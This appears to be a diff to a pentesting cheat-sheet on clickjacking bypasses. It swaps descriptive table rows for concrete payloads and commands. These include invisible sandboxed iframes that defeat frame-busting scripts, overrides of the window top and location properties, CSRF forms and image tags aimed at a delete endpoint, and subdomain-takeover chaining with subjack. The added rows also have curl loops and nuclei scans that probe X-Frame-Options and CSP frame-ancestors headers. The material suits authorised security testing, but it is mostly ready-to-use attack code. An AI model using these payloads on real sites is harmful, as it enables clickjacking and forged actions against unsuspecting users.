@@ -23,40 +23,26 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `if (top != self) top.location = self.location` | `<iframe sandbox>` removes script execution | Sandbox bypass. |
-| `if (top != self) top.location.replace(self.location)` | Same | Same. |
-| `if (window != top) top.location = window.location` | Same | Same. |
-| `parent.location = self.location` | Sandbox | Same. |
-| Combine con `delete top.location` | Old browsers — defunct | Legacy. |
-| `<base target="_top">` | Force frame target | Edge. |
-| Frame-busting busting (atacante side) | Override `top.location` setter | Standard bypass. |
-| Set `location.href` setter | Atacante's parent intercepts | Old browsers. |
-| `onbeforeunload` handler | Cancel navigation event | Standard. |
-| `setInterval` continuous override | Race condition | Edge. |
-| Combine con `<noscript>` block | If JS disabled | Edge fallback. |
-| Modern frame-busting | Use CSP frame-ancestors instead | Defense. |
-| Document.write trick | Edge legacy | Old browsers. |
-| Sandbox without `allow-scripts` | Removes JS entirely | Standard bypass. |
+| `<iframe src="https://target.com/x" sandbox="allow-forms allow-same-origin" style="opacity:0.0001;..."></iframe>` | Sandbox sin `allow-scripts` strips frame-buster JS | Frame-busting JS strip. |
+| `<iframe src="https://target.com/x" sandbox="allow-forms" style="opacity:0.0001;..."></iframe>` | Tightest sandbox forms-only | Forms-only attack. |
+| `<iframe src="https://target.com/x" sandbox="" style="opacity:0.0001;..."></iframe>` | Empty sandbox most restrictive | Most restrictive. |
+| `<script>Object.defineProperty(window,'top',{get:()=>window})</script>` (en outer page) | Override `top` getter pre-load iframe | top getter spoof. |
+| `<script>Object.defineProperty(window,'location',{set:()=>{}})</script>` | Override location setter swallow | location setter swallow. |
+| `<script>window.onbeforeunload=()=>'stay'</script>` | Cancel navigation events | Navigation cancel. |
+| `<base target="_top">` (en outer page) | Force frame target | base target trick. |
+| `<iframe sandbox="allow-same-origin allow-top-navigation-by-user-activation" src="https://target.com/x"></iframe>` | Top-navigation only on user activation | Granular permission. |
+| `curl -s https://target.com/admin \| grep -oE 'top != self\|frame.busting\|top\\.location'` | Detect frame-busting patterns in source | Pre-attack detect. |
+| Burp Repeater → response → search "top != self" / "self.location" | Manual frame-buster identify | Manual. |
+| `<iframe src="https://target.com/x" csp="script-src 'none'" style="opacity:0.0001"></iframe>` (HTML5 csp attr) | iframe-level CSP override strips JS | iframe csp attr. |
+| `<iframe sandbox="allow-scripts" srcdoc='<base target=_self><iframe src=https://target.com/x></iframe>'></iframe>` | Nested srcdoc + base target | Nested sandbox. |
 ^cj-bypass-jsbusting
 
 ### Sandbox bypass PoC
 
 ```html
-<!DOCTYPE html>
-<html>
-<body>
-<iframe src="https://target.com/page-with-frame-busting" 
+<iframe src="https://target.com/page-with-frame-busting"
         sandbox="allow-forms allow-same-origin"
         style="opacity:0.001;width:100%;height:100%"></iframe>
-<!--
-sandbox attribute:
-  - Removes script execution if 'allow-scripts' not specified
-  - Frame-busting JS doesn't execute
-  - But forms still work (allow-forms)
-  - User can still click iframe
--->
-</body>
-</html>
 ```
 
 ___
@@ -65,20 +51,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `<iframe sandbox>` | Most restrictive — no scripts, forms, plugins, navigation | Standard bypass. |
-| `sandbox="allow-forms"` | Forms work, scripts disabled | Form-based attacks. |
-| `sandbox="allow-same-origin"` | Same-origin policy enforced | Edge. |
-| `sandbox="allow-scripts"` | Scripts work | Defeats sandbox. |
-| `sandbox="allow-top-navigation"` | Frame can navigate parent | Combine. |
-| `sandbox="allow-popups"` | Popups | Edge. |
-| `sandbox="allow-pointer-lock"` | Pointer manipulation | Edge cursor-jacking. |
-| Combine values con space | `sandbox="allow-forms allow-same-origin"` | Multi-flag. |
-| No `allow-scripts` | Disables frame-busting JS | Standard bypass. |
-| `seamless` attribute | Deprecated en HTML5 | Legacy. |
-| `allowfullscreen` | Full-screen mode | Combine fullscreen abuse. |
-| `loading="lazy"` | Lazy load | Edge. |
-| Combine con `srcdoc` | Inline content sandbox | Edge. |
-| Browser-specific behaviors | Per-browser sandbox enforcement | Edge. |
+| `<iframe sandbox src="https://target.com/x"></iframe>` | Most restrictive — no scripts/forms/plugins | Most restrictive. |
+| `<iframe sandbox="allow-forms" src="https://target.com/x"></iframe>` | Forms allowed, scripts disabled | Form-based CJ. |
+| `<iframe sandbox="allow-forms allow-same-origin" src="https://target.com/x"></iframe>` | Forms + SOP enforced | Form combo. |
+| `<iframe sandbox="allow-top-navigation" src="https://target.com/x"></iframe>` | Frame can navigate parent | Navigation combo. |
+| `<iframe sandbox="allow-pointer-lock" src="https://target.com/x"></iframe>` | Pointer-lock allowed | Pointer combo. |
+| `<iframe sandbox="allow-popups" src="https://target.com/x"></iframe>` | Popups allowed | Popup combo. |
+| `<iframe sandbox="allow-forms allow-same-origin allow-scripts" src="..."></iframe>` | All needed flags (frame-buster still defeated if app uses location.replace) | Edge. |
+| `<iframe sandbox="allow-forms" srcdoc='<iframe src=https://target.com/x></iframe>'></iframe>` | Nested sandbox + srcdoc strip JS | Nested strip. |
+| `<iframe sandbox="allow-forms allow-modals" src="https://target.com/x"></iframe>` | Modals allowed | Modal combo. |
+| `<iframe sandbox="allow-forms allow-orientation-lock" src="https://target.com/x"></iframe>` | Orientation lock allowed | Orientation. |
+| `<iframe allowfullscreen sandbox="allow-forms" src="..."></iframe>` | Fullscreen + restricted | FS combo. |
+| `<iframe sandbox="allow-forms allow-presentation" src="..."></iframe>` | Presentation API allowed | Presentation. |
 ^cj-bypass-sandbox
 
 ___
@@ -87,20 +71,19 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `ALLOW-FROM` deprecated | Modern browsers ignore | Bypass via CSP if XFO ALLOW-FROM. |
-| Old IE / browser-specific | XFO inconsistent support | Edge. |
-| Subdomain con SAMEORIGIN | Frame from `evil.target.com` if subdomain takeover | SDT combo. |
-| CSP missing | Only XFO active → some bypass via CSP precedence | Edge. |
-| HTML form submission | XFO doesn't block forms | Forms still submitable. |
-| Image src cross-origin | XFO doesn't block images | Limited utility. |
-| `<object>` / `<embed>` | XFO may not apply | Edge legacy. |
-| Combine con MIME sniffing | If app serves frame-allowed page from one path | Per-app. |
-| Per-route XFO | Some routes protected, others not | Granular bypass. |
-| HTTP/HTTPS confusion | Legacy mixed-content scenarios | Edge. |
-| Internal vs external XFO | Different policies | Edge. |
-| Apache misconfig | XFO header on certain paths only | Edge. |
-| CDN strip XFO | Some CDNs may strip headers | Misconfig. |
-| Combine con browser zoom abuse | Modern browser display tricks | Edge. |
+| `curl -I https://target.com/admin \| grep -i x-frame-options` | Check XFO header presence | Pre-attack. |
+| `curl -I https://target.com/admin/x \| grep -i x-frame-options` (multiple paths) | Per-path XFO check granular | Granular. |
+| `curl -I -H "User-Agent: MSIE 9.0" https://target.com/x \| grep x-frame-options` | Probe `ALLOW-FROM` legacy IE | IE-specific. |
+| `for p in /admin /api/admin /admin.php /admin/index.html /admin/login; do echo "[$p]"; curl -sI "https://target.com$p" \| grep -iE 'x-frame\|frame-ancestors'; done` | Bulk path XFO probe | Bulk probe. |
+| `subjack -w subs.txt -c fingerprints.json -t 100` claim subdomain → `<iframe src="https://target.com/admin/x"></iframe>` (from claimed sub) | Subdomain SAMEORIGIN bypass via takeover | SDT combo. |
+| `curl -I https://target.com/admin \| grep -iE 'x-frame-options:\s*ALLOW-FROM'` | Detect deprecated ALLOW-FROM | Legacy deprecated. |
+| `nuclei -t http/misconfiguration/clickjacking.yaml -l targets.txt` | Bulk XFO scan | Bulk scan. |
+| `curl -I https://target.com/legacy.html \| grep x-frame-options` (legacy paths) | Legacy paths sin XFO | Legacy paths. |
+| Burp Repeater → multiple paths → compare XFO presence | Manual granular probe | Workflow. |
+| `<form action="https://target.com/api/delete" method="POST"><input type="submit"></form>` (forms not XFO-blocked) | Form submission XFO bypass | Form abuse. |
+| `<img src="https://target.com/api/delete?confirm=yes">` (GET endpoint) | Image GET CSRF not XFO-blocked | GET CSRF. |
+| `curl -I http://target.com/admin` (HTTP vs HTTPS XFO diff) | HTTP/HTTPS XFO diff | Mixed scheme. |
+| `curl -I -H "Host: target.com" https://CDN_IP/admin` (CDN strip headers) | CDN strip XFO probe | CDN misconfig. |
 ^cj-bypass-xfo
 
 ___
@@ -109,20 +92,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Wildcard subdomain | `frame-ancestors *.target.com` → atacante claims subdomain | SDT combo. |
-| `frame-ancestors *` | Permissive — direct framing | Misconfig. |
-| Specific allowed domain | Atacante compromises allowed domain | XSS chain. |
-| CDN-allowed origin | If CDN domain trusted, atacante's CDN content frames | Edge. |
-| `data:` allowed | Frames con data URI | Edge. |
-| `blob:` allowed | Frames con blob URLs | Edge. |
-| Per-page CSP differences | Some pages no frame-ancestors | Granular. |
-| CSP missing on subdirectory | App config inconsistent | Misconfig. |
-| Sandbox vs frame-ancestors | Different defenses | Combine. |
-| Old browsers no CSP support | Pre-Chrome 28 / Firefox 23 | Legacy users. |
-| Browser quirks | Per-version CSP enforcement | Edge. |
-| Combine con SDT | Subdomain Takeover defeats wildcard | Standard chain. |
-| XSS en allowed origin | Compromise allowed origin | Compound. |
-| `frame-ancestors 'self'` con OAuth flow | OAuth pages still framed via OAuth client | Edge. |
+| `curl -I https://target.com/admin \| grep -i 'content-security-policy.*frame-ancestors'` | Check frame-ancestors policy | Pre-attack. |
+| `curl -I https://target.com/admin \| grep -iE 'content-security-policy.*frame-ancestors:\s*\*'` | Detect wildcard `*` permissive | Misconfig. |
+| `subjack -w subs.txt -c fingerprints.json -t 100` (claim sub) luego `<iframe src=https://target.com/admin>` from claimed sub | Subdomain takeover + wildcard subdomain frame-ancestors | SDT combo. |
+| `<iframe src="https://target.com/admin"></iframe>` (host en allowed origin via XSS) | XSS in allowed origin → CJ from there | XSS chain. |
+| `<iframe src="data:text/html,<iframe src=https://target.com/admin></iframe>"></iframe>` (if data: allowed) | data: URI nesting | data: scheme allowed. |
+| `<iframe src="blob:https://target.com/x"></iframe>` (if blob: allowed) | blob: URL framing | blob: allowed. |
+| `for p in /admin /admin/x /admin/y /static; do echo "[$p]"; curl -sI "https://target.com$p" \| grep frame-ancestors; done` | Per-path frame-ancestors granular check | Granular check. |
+| `curl -I https://target.com/oauth/authorize \| grep frame-ancestors` (OAuth pages often less protected) | OAuth-specific frame-ancestors check | OAuth gap. |
+| Burp Repeater → multiple paths → compare CSP frame-ancestors | Manual granular CSP probe | Workflow. |
+| `curl -I -H "User-Agent: Mozilla/4.0" https://target.com/admin` | Legacy User-Agent — pre-CSP browser | Legacy users. |
+| `curl -I https://target.com/admin \| grep -iE 'content-security-policy-report-only'` | Report-only mode bypass | Report-only enforcement none. |
+| `nuclei -t http/misconfiguration/csp-misconfiguration.yaml -u https://target.com` | Nuclei CSP misconfig scan | Auto scan. |
 ^cj-bypass-csp
 
 ___
@@ -131,21 +112,21 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Old IE compatibility | XFO inconsistent en IE 8/9 | Legacy. |
-| Firefox `frame-ancestors` | Modern browsers all support | Standard. |
-| Chrome strict mode | Most strict | Default. |
-| Safari WebKit quirks | Per-version | Edge. |
-| Mobile WebView | App-embedded browsers | Different rules. |
-| `X-Frame-Options` case sensitivity | Some servers case-sensitive | Edge. |
-| Header order | Some browsers prefer XFO over CSP | Per-browser. |
-| Multiple CSP headers | Each CSP intersects, not overrides | Standard. |
-| `report-only` mode | Detection but no enforcement | Edge bypass. |
-| HTTP vs HTTPS | XFO sent over HTTP only? | Misconfig. |
-| Caching headers | Stale CSP cached | Edge. |
-| Edge cache strip | CDN strips frame protection | Misconfig. |
-| Origin trial features | Modern browser features | Edge. |
-| Combine con `srcdoc` | Inline iframe content | Standard. |
-| `<frame>` legacy tag | Pre-iframe alt | Legacy. |
+| `curl -I -H "User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; ...)" https://target.com/admin \| grep x-frame-options` | IE 8/9 XFO inconsistency probe | Legacy IE. |
+| Firefox DevTools → Network → check `Content-Security-Policy: frame-ancestors` | Browser-specific enforce check | Browser test. |
+| Chrome `--disable-web-security --user-data-dir=/tmp/chrome-cj` | Local CJ debug Chrome | Local debug. |
+| Safari Preferences → Develop → Disable Cross-Origin Restrictions | Safari WebKit local debug | Safari debug. |
+| Mobile WebView test: launch Android emulator + load CJ page | Mobile WebView CJ test | Mobile test. |
+| `curl -I https://target.com/admin \| grep -iE 'x-frame-options|x[-_]Frame[-_]Options'` (case variants) | Case-sensitivity XFO test | Edge case. |
+| `curl -i https://target.com/admin \| grep -ciE 'content-security-policy'` (multiple CSP headers) | Multi-CSP headers intersect | Multi-CSP. |
+| `curl -I https://target.com/admin \| grep -i 'content-security-policy-report-only'` | Report-only no enforcement | Report-only edge. |
+| `curl -I http://target.com/admin && curl -I https://target.com/admin` (HTTP vs HTTPS XFO) | Mixed scheme XFO inconsistency | Mixed scheme. |
+| `curl -I -H "Cache-Control: max-age=0" https://target.com/admin \| grep -E 'x-frame\|frame-ancestors'` | Stale CSP cached | Stale cache. |
+| `curl -H "Origin: https://CDN_ORIGIN" https://target.com/admin -I` | CDN origin-aware probe | CDN edge. |
+| `<iframe srcdoc='<iframe src=https://target.com/admin></iframe>'></iframe>` (srcdoc context) | srcdoc iframe context test | srcdoc context. |
+| `<frame src="https://target.com/admin">` (legacy frame tag) | Legacy frame tag (most browsers ignore) | Edge legacy. |
+| `<embed src="https://target.com/admin">` (embed tag XFO check) | Embed tag XFO check | Edge embed. |
+| `<object data="https://target.com/admin"></object>` (object tag XFO check) | Object tag XFO check | Edge object. |
 ^cj-bypass-quirks
 
 ***
